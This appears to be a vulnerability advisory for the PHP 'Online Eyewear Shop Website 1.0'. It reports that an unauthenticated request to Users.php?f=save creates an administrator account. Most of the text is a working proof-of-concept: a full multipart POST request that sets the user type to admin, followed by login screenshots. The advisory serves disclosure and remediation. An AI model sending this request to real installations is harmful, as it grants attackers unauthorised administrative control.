## Online Eyewear Shop Website has a Add any user at the front desk vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Users.php?f=save 

## Description:
Online Eyewear Shop Website1.0 has a Add any user at the front desk in /Users.phpf=save. An attacker can modify the vulnerability to register any administrator user and log in to the system.

Status: CRITICAL

POC
```
POST /oews/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------130096647026617135944608936
Content-Length: 1011
Origin: http://localhost
Connection: close
Referer: http://localhost/oews/admin/?page=user/manage_user
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------130096647026617135944608936
Content-Disposition: form-data; name="id"


-----------------------------130096647026617135944608936
Content-Disposition: form-data; name="firstname"

test
-----------------------------130096647026617135944608936
Content-Disposition: form-data; name="middlename"

test
-----------------------------130096647026617135944608936
Content-Disposition: form-data; name="lastname"

test
-----------------------------130096647026617135944608936
Content-Disposition: form-data; name="username"

test
-----------------------------130096647026617135944608936
Content-Disposition: form-data; name="password"

123456
-----------------------------130096647026617135944608936
Content-Disposition: form-data; name="type"

1
-----------------------------130096647026617135944608936
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------130096647026617135944608936--
```

Add administrator user test directly in the front end
![CleanShot 2024-09-20 at 16 46 29@2x](https://github.com/user-attachments/assets/cda8ef82-948a-442b-b507-175fb176fc63)

You can log in directly via test/123456

![CleanShot 2024-09-20 at 16 48 48@2x](https://github.com/user-attachments/assets/e157e430-604e-4b0e-a67e-a7a8dc188029)

![CleanShot 2024-09-20 at 16 49 03@2x](https://github.com/user-attachments/assets/f1de6039-9867-4077-86c5-81c96fa2b7fe)




